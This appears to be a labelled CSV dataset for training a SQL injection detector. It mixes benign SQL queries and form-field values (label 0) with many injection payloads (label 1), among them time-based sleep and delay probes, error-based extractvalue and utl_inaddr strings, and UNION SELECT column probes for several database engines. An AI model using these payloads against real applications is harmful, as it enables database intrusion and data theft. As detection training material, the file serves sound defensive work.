Query,Label
SELECT water,0
"1""   )    )     )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (     (  ""ynwr"" like ""ynwr",1
8409,0
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0
perr@pasajesaereosbaratos.pm,0
SELECT * FROM dust WHERE against BETWEEN means09/01/1996massage AND cream15/31/1996variety,0
SELECT * FROM oil WHERE modern = 'quiet'  OR mirror = 'him',0
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'bmnf' like 'bmnf,1
1'   )    )    as fcjk where 7755  =  7755,1
1%'   )    )     )   waitfor delay '0:0:5' and    (    (     (  '%'  =  ',1
"1'   )    )    as ngoo where 8641  =  8641 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1"" where 7290  =  7290 union all select null,null,null,null,null,null,null--",1
SELECT * FROM seed WHERE hot = 'lovely'  OR conversation = 'century',0
SELECT * FROM scientific,0
SELECT TOP 3 * FROM steep WHERE off = 'captain',0
SELECT * FROM jar WHERE trail = 'structure' FETCH FIRST 3 ROWS ONLY,0
"   SELECT slipped, sister, street FROM exactly WHERE blood  IS NULL",0
SELECT TOP 50 PERCENT * FROM form,0
docken.carmi@soyrojo.so,0
"1%""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""%""  =  """,1
"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",1
"iif  (  8214  =  4954,1,1/0  )  ",1
SELECT * FROM with WHERE dress = 'band' LIMIT 3,0
saleh,0
SELECT * FROM  ( SELECT problem FROM exercise ) ,0
"   SELECT Employees.toward, COUNT ( Orders.onID )  AS swimmingFROM    ( OrdersINNER JOIN flow ON Orders.sisterID  =  Employees.courtID ) ",0
salvina,0
SELECT * FROM arrive WHERE time  BETWEEN 10 AND 20,0
"SELECT * FROM baseball WHERE evidence BETWEEN ""throat"" AND    ""weight""",0
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""acbq"" like ""acbq",1
"calle arfian 36,",0
" select * from users where id  =  1 or ""]  )  "" or 1  =  1 -- 1",1
SELECT TOP 50 PERCENT * FROM piano,0
 UPDATE suit SET nearer = 'share'WHERE decide = 'forth',0
SELECT * FROM drew WHERE NOT fuel = 'soldier'  AND NOT scene = 'chicken',0
SELECT AVG ( bark ) FROM minerals SELECT SUM ( brown ) ,0
SELECT COUNT ( angry ) FROM everywhere,0
bardallur,0
"-1050""   )    )    or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (   ""orfo"" like ""orfo",1
houstin@maxitienda.zr,0
dalal,0
SELECT * FROM tip  WHERE onto NOT LIKE '[table]%',0
"-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#",1
"1"" where 1852  =  1852 union all select null,null,null,null,null,null,null,null,null#",1
"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  # tcrm",1
"   SELECT railroad,well,stove,policeman,level     (  (  source JOIN muscle ON eventually.citizen =  library.sense )   INNER JOIN willingON Orders.danger =  away.compositionID ) ",0
perendengue,0
6.03487E+15,0
SELECT * FROM ProductsWHERE ProductName BETWEEN 'Carnarvon Tigers' AND 'Mozzarella    di Giovanni',0
-1344  )   as gqgi where 2545  =  2545 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
SELECT * FROM speech,0
57i-9557a,0
sanidad,0
"iif  (  1095  =  2853,1,1/0  )  ",1
"1 where 8045  =  8045 union all select null,null,null--",1
SELECT * FROM chance WHERE similar = 'pile',0
SELECT * FROM shut WHERE larger NOT LIKE 'full%',0
"pasaje santo angel, 190,",0
villalgordo del marquesado,0
"   SELECT include, voice, ate FROM please WHERE can  IS NULL",0
"-4798""   )    )     )   union all select 7892,7892,7892,7892,7892,7892,7892,7892,7892,7892#",1
SELECT * FROM join WHERE took LIKE '%close%',0
"1%'   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",1
18129,0
1' where 1017  =  1017 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,1
corota,0
"  SELECT fullID AS ID, whether AS exercise FROM speech",0
"1 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
"   SELECT Employees.show, COUNT ( Orders.copperID )  AS forgetFROM    ( OrdersINNER JOIN slept ON Orders.learnID  =  Employees.filmID ) ",0
SELECT * FROM mean WHERE market LIKE '%explore%',0
1  )   where 4780  =  4780,1
SELECT * FROM right WHERE industrial NOT LIKE 'fifth%',0
SELECT * FROM learn FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM chamber WHERE brave  BETWEEN 10 AND 20,0
SELECT * FROM star WHERE NOT own = 'structure'  AND NOT now = 'fair',0
1'  )   where 6045  =  6045,1
SELECT * FROM trap,0
7770,0
szeto,0
-3136%'  )   or 3400  =  6002,1
SELECT * FROM thousand WHERE exciting = 'courage' LIMIT 3,0
dyck,0
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'wbsz'  =  'wbsz",1
"INSERT INTO wrong ( taste, upward, daughter, develop, word, very )  VALUES  ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )  ",0
*|,1
DELETE FROM necessary,0
SELECT COUNT ( particularlyID ) FROM bee,0
22440,0
SELECT * FROM paper FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT * FROM lot WHERE present NOT LIKE '[ever]%',0
darbie,0
SELECT * FROM seems FETCH FIRST 3 ROWS ONLY,0
" select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1
"1  )   where 6720  =  6720 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
SELECT AVG ( screen ) FROM labor SELECT SUM ( sound ) ,0
FROM  ( SELECT DISTINCT save FROM chose ) ,0
SELECT AVG ( together ) FROM youth SELECT SUM ( tight ) ,0
"1,  (  select   (  case when   (  5141  =  5141  )   then   (  ascii  (  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )     )   else 5141/  (  select 0 from   (  values  (  0   )    )     )   end  )   from   (  values  (  0   )    )     )  ",1
"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and 'ytlf'  =  'ytlf",1
SELECT * FROM Customers  WHERE CustomerName LIKE 'a__%';,0
"1""   )    )    as etap where 8506  =  8506 union all select null,null,null,null#",1
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,1
1'+  (  select tdkt where 4535  =  4535,1
"-2125""   )    )    or 8571  =  8571--",1
"INSERT INTO remain ( disappear, drawn, bite, number, rough, please )  VALUES  ( 'fifteen', 'dance'. seed', 'lack', 'period', 'ten', 'task' )  ",0
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
SELECT * FROM alone WHERE bush BETWEEN 'volume' AND 'spread',0
olmos de ojeda,0
"-1631%""  )   or elt  (  8285  =  1709,1709  )   and   (  ""%""  =  """,1
SELECT AVG ( journey ) FROM orange SELECT SUM ( farm ) ,0
SELECT drew,0
"INSERT INTO became  ( dark, complete, essential )  VALUES  ( 'freedom', 'wire', 'produce' )  ",0
"1  )   as xuvz where 3061  =  3061 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
vadell comalada,0
foguear,0
"INSERT INTO prize ( low, opinion, action, division, though, taken )  VALUES  ( 'order', 'spider'. dust', 'fort', 'view', 'factor', 'bigger' )  ",0
SELECT * FROM keep  WHERE attached = gate,0
"  SELECT Orders.childrenrID, Employees.review, Employees.instead FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.quicklyID ORDER BY Orders.reasonID",0
*/*,1
SELECT COUNT ( DISTINCT fuel )  FROM history,0
3ist423o,0
indocto,0
"1""   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
lucar planes,0
"1'||  (  select 'votg' where 5105  =  5105 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
hermindo,0
SELECT * FROM make FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM magic,0
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1
SELECT * FROM  ( SELECT treated FROM naturally ) ,0
SELECT AVG ( empty ) FROM collect SELECT SUM ( someone ) ,0
-9145'  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'yvfl' like 'yvfl,1
danisa,0
-1854'  )   as fmmq where 7326  =  7326 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
49540097y,0
SELECT flight ( s )  FROM basis UNION ALL,0
SELECT result FROM proud UNION ALL SELECT farm FROM silk ORDER BY uncle,0
select   (  case when   (  4043  =  5276  )   then 4043 else 4043*  (  select 4043 from information_schema.character_sets  )   end  )  #,1
bossa,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",1
SELECT animal FROM first,0
okura4,0
SELECT represent ( s ) FROM ordinary INNER JOIN,0
1'   )    )    and sleep  (  5  )   and    (    (   'tcwt'  =  'tcwt,1
tapioles,0
gowan,0
SELECT MIN ( somewhere )  AS individual FROM held,0
